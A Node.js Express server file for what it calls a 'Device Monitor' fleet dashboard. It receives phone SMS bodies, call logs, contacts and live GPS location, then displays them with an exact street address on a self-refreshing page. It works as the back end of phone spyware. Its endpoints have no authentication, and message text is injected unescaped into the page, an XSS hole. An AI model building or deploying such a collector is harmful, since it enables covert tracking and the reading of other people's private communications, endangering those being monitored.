const express = require('express');
const cors = require('cors');
const app = express();

app.use(express.json({ limit: '10mb' }));
app.use(cors());

let devicesData = {};
let instantEvents = [];

// Helper function to format time in Kenya (EAT / UTC+3)
function getKenyanTime(dateObj) {
    if (!dateObj) return "Unknown time";
    const d = new Date(dateObj);
    return d.toLocaleString('en-KE', { 
        timeZone: 'Africa/Nairobi', 
        dateStyle: 'short', 
        timeStyle: 'short' 
    });
}

// 1. Phone sends data
app.post('/api/report', (req, res) => {
    const data = req.body;
    const deviceId = data.device?.model || 'Unknown Device';
    console.log(`📥 Data received from ${deviceId}`);
    devicesData[deviceId] = { 
        ...data, 
        lastUpdated: new Date().toLocaleString('en-KE', { timeZone: 'Africa/Nairobi', timeStyle: 'short' }) 
    };
    res.json({ success: true });
});

// 2. Phone sends instant SMS/Call alerts
app.post('/api/instant-event', (req, res) => {
    const event = req.body;
    event.time = new Date().toLocaleString('en-KE', { timeZone: 'Africa/Nairobi', timeStyle: 'short' });
    instantEvents.unshift(event);
    if (instantEvents.length > 10) instantEvents.pop();
    res.json({ success: true });
});

// 3. Dashboard fetches data
app.get('/api/devices', (req, res) => res.json(devicesData));
app.get('/api/instant-events', (req, res) => res.json(instantEvents));
app.post('/api/clear-events', (req, res) => { instantEvents = []; res.json({success: true}); });

// 4. The Dashboard UI
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Device Monitor | Fleet Dashboard</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
        <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
        <style>
            body { font-family: 'Inter', system-ui, sans-serif; background-color: #0f172a; color: #e2e8f0; }
            .custom-scrollbar::-webkit-scrollbar { width: 6px; }
            .custom-scrollbar::-webkit-scrollbar-track { background: #1e293b; border-radius: 4px; }
            .custom-scrollbar::-webkit-scrollbar-thumb { background: #475569; border-radius: 4px; }
            #map { height: 300px; border-radius: 1rem; z-index: 1; border: 1px solid #334155; }
            
            details > summary { list-style: none; cursor: pointer; }
            details > summary::-webkit-details-marker { display: none; }
            details[open] .arrow { transform: rotate(180deg); }
            .arrow { transition: transform 0.2s; }
        </style>
    </head>
    <body class="min-h-screen p-6">
        <div class="max-w-7xl mx-auto">
            
            <div class="flex flex-col md:flex-row md:items-center justify-between mb-10 pb-6 border-b border-slate-800">
                <div>
                    <h1 class="text-4xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-indigo-500 tracking-tight">Device Monitor</h1>
                    <p class="text-sm text-slate-400 mt-2 font-medium tracking-wide">SECURE ENTERPRISE FLEET TELEMETRY (EAT Time)</p>
                </div>
            </div>

            <div id="devices-container" class="space-y-8">
                <div class="text-center text-slate-500 mt-32">Waiting for devices to connect...</div>
            </div>
        </div>

        <script>
            let mapInstance = null;
            let mapMarker = null;
            let currentGeocodedAddress = "Fetching address...";
            let lastLocationKey = "";

            async function getAddress(lat, lng) {
                try {
                    const response = await fetch(\`https://nominatim.openstreetmap.org/reverse?format=json&lat=\${lat}&lon=\${lng}\`);
                    const data = await response.json();
                    return data.display_name || "Unknown Location";
                } catch (e) {
                    return "Location unavailable";
                }
            }

            function formatKenyanTime(dateInput) {
                if (!dateInput) return "Unknown time";
                const d = new Date(dateInput);
                return d.toLocaleString('en-KE', { timeZone: 'Africa/Nairobi', dateStyle: 'short', timeStyle: 'short' });
            }

            async function fetchData() {
                try {
                    const res = await fetch('/api/devices');
                    const devices = await res.json();
                    const container = document.getElementById('devices-container');
                    
                    if (Object.keys(devices).length === 0) return;

                    let html = '';
                    
                    for (const [id, data] of Object.entries(devices)) {
                        const isCharging = data.isCharging 
                            ? '<span class="text-emerald-400 text-sm font-bold flex items-center gap-1">⚡ Charging</span>' 
                            : '<span class="text-amber-400 text-sm font-bold flex items-center gap-1">🔋 Battery</span>';

                        const locationKey = \`\${data.location?.lat},\${data.location?.lng}\`;
                        if (locationKey !== lastLocationKey && data.location?.lat !== 0) {
                            lastLocationKey = locationKey;
                            currentGeocodedAddress = "Fetching address...";
                            getAddress(data.location.lat, data.location.lng).then(addr => {
                                currentGeocodedAddress = addr;
                                const addressEl = document.getElementById('address-text');
                                if (addressEl) addressEl.innerText = addr;
                            });
                        }

                        const smsHtml = (data.sms || []).map(s => {
                            let timeStr = formatKenyanTime(s.date);
                            return \`
                            <details class="group bg-slate-800/50 rounded-xl border border-slate-700/30 mb-2 overflow-hidden">
                                <summary class="flex justify-between items-center p-3 hover:bg-slate-700/50 transition">
                                    <div class="flex flex-col min-w-0 pr-2">
                                        <span class="text-purple-300 font-bold text-sm truncate">\${s.address}</span>
                                        <span class="text-xs text-slate-400 truncate">\${s.body}</span>
                                    </div>
                                    <div class="flex items-center gap-2 shrink-0">
                                        <span class="text-[10px] text-slate-500 font-mono">\${timeStr}</span>
                                        <svg class="w-4 h-4 text-slate-500 arrow" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
                                    </div>
                                </summary>
                                <div class="p-4 bg-slate-900 border-t border-slate-700 text-sm text-slate-300">
                                    \${s.body}
                                </div>
                            </details>
                            \`;
                        }).join('');

                        const callsHtml = (data.calls || []).map(c => {
                            let timeStr = formatKenyanTime(c.date);
                            return \`
                            <div class="flex justify-between items-center p-3 mb-1 bg-slate-800/50 rounded-xl border border-slate-700/30">
                                <div>
                                    <span class="text-blue-300 font-medium text-sm block">\${c.number}</span>
                                    <span class="text-[10px] text-slate-500">\${timeStr}</span>
                                </div>
                                <div class="text-right">
                                    <span class="text-xs text-slate-400 block">\${c.type}</span>
                                    <span class="text-[10px] text-slate-500">\${c.duration}s</span>
                                </div>
                            </div>
                            \`;
                        }).join('');

                        html += \`
                        <div class="bg-slate-800/80 backdrop-blur rounded-3xl border border-slate-700 shadow-2xl overflow-hidden mb-8">
                            
                            <div class="bg-slate-800 p-6 border-b border-slate-700 flex justify-between items-center">
                                <div class="flex items-center gap-4">
                                    <div class="bg-blue-500/20 p-3 rounded-2xl border border-blue-500/30">
                                        <svg class="w-8 h-8 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
                                    </div>
                                    <div>
                                        <h2 class="text-2xl font-bold text-white tracking-wide">\${id}</h2>
                                        <p class="text-xs text-slate-400 font-mono mt-1">\${data.device?.os || 'Android'}</p>
                                    </div>
                                </div>
                                <div class="text-right">
                                    <span class="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-slate-900 border border-slate-700 text-xs font-medium text-slate-300">
                                        <span class="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></span>
                                        Updated: \${data.lastUpdated}
                                    </span>
                                </div>
                            </div>

                            <div class="p-6 grid grid-cols-1 lg:grid-cols-3 gap-6 border-b border-slate-700/50">
                                <div class="flex flex-col gap-4 justify-center">
                                    <div>
                                        <span class="text-[10px] text-slate-500 font-bold uppercase tracking-widest mb-1 block">Battery</span>
                                        <div class="flex items-center gap-3">
                                            <span class="text-4xl font-black text-white">\${data.battery || 0}%</span>
                                            \${isCharging}
                                        </div>
                                    </div>
                                    <div>
                                        <span class="text-[10px] text-slate-500 font-bold uppercase tracking-widest mb-1 block">Network</span>
                                        <span class="text-lg font-bold text-white">\${data.online ? "🟢 Online" : "🔴 Offline"}</span>
                                    </div>
                                    <div>
                                        <span class="text-[10px] text-slate-500 font-bold uppercase tracking-widest mb-1 block">Wi-Fi / Data</span>
                                        <span class="text-lg font-bold text-white truncate block">\${data.wifi}</span>
                                    </div>
                                </div>

                                <div class="lg:col-span-2 relative bg-slate-900 rounded-2xl border border-slate-700/50 overflow-hidden flex flex-col">
                                    <div id="map" class="w-full h-[300px]"></div>
                                    <div class="p-4 bg-slate-800 border-t border-slate-700 flex items-start gap-3">
                                        <div class="bg-emerald-500/20 p-2 rounded-lg text-emerald-400 mt-0.5">
                                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
                                        </div>
                                        <div>
                                            <div class="text-[10px] text-slate-500 font-bold uppercase tracking-widest">Exact Location</div>
                                            <div id="address-text" class="text-sm font-medium text-slate-200 mt-0.5 leading-snug">\${currentGeocodedAddress}</div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="p-6 grid grid-cols-1 md:grid-cols-3 gap-6">
                                <div class="bg-slate-900 rounded-2xl border border-slate-700/50 overflow-hidden flex flex-col h-80">
                                    <div class="p-4 border-b border-slate-700/50 bg-slate-800/30 flex items-center gap-2">
                                        <h3 class="font-bold text-slate-300 text-sm uppercase tracking-wider">Call Logs</h3>
                                    </div>
                                    <div class="flex-1 overflow-y-auto custom-scrollbar p-2">
                                        \${callsHtml}
                                    </div>
                                </div>

                                <div class="bg-slate-900 rounded-2xl border border-slate-700/50 overflow-hidden flex flex-col h-80">
                                    <div class="p-4 border-b border-slate-700/50 bg-slate-800/30 flex items-center gap-2">
                                        <h3 class="font-bold text-slate-300 text-sm uppercase tracking-wider">Recent SMS</h3>
                                    </div>
                                    <div class="flex-1 overflow-y-auto custom-scrollbar p-2">
                                        \${smsHtml}
                                    </div>
                                </div>

                                <div class="bg-slate-900 rounded-2xl border border-slate-700/50 overflow-hidden flex flex-col h-80">
                                    <div class="p-4 border-b border-slate-700/50 bg-slate-800/30 flex items-center gap-2">
                                        <h3 class="font-bold text-slate-300 text-sm uppercase tracking-wider">Contacts</h3>
                                    </div>
                                    <div class="flex-1 overflow-y-auto custom-scrollbar p-2">
                                        \${(data.contacts || []).map(c => \`
                                            <div class="flex justify-between items-center p-3 mb-1 bg-slate-800/50 rounded-xl border border-slate-700/30">
                                                <span class="text-slate-200 font-medium text-sm">\${c.name}</span>
                                                <span class="text-xs text-slate-500">\${c.number}</span>
                                            </div>
                                        \`).join('')}
                                    </div>
                                </div>
                            </div>
                        </div>
                        \`;
                    }
                    
                    // ✅ THE FIX: Only overwrite the HTML if the map doesn't exist yet
                    if (!document.getElementById('map')) {
                        container.innerHTML = html;
                    } else {
                        // If map exists, just update the address text so we don't destroy the map
                        const addressEl = document.getElementById('address-text');
                        if (addressEl) addressEl.innerText = currentGeocodedAddress;
                    }

                    // Initialize or Update Map
                    const firstDevice = Object.values(devices)[0];
                    if (firstDevice && firstDevice.location && firstDevice.location.lat !== 0) {
                        const lat = firstDevice.location.lat;
                        const lng = firstDevice.location.lng;

                        setTimeout(() => {
                            if (!mapInstance) {
                                mapInstance = L.map('map').setView([lat, lng], 16);
                                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OpenStreetMap' }).addTo(mapInstance);
                                mapMarker = L.marker([lat, lng]).addTo(mapInstance);
                            } else {
                                mapInstance.setView([lat, lng]);
                                mapMarker.setLatLng([lat, lng]);
                            }
                            mapInstance.invalidateSize();
                        }, 100);
                    }

                } catch (e) {
                    console.error("Error fetching data:", e);
                }
            }
            
            fetchData();
            setInterval(fetchData, 3000);
        </script>
    </body>
    </html>
    `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Dashboard running on port ${PORT}`));
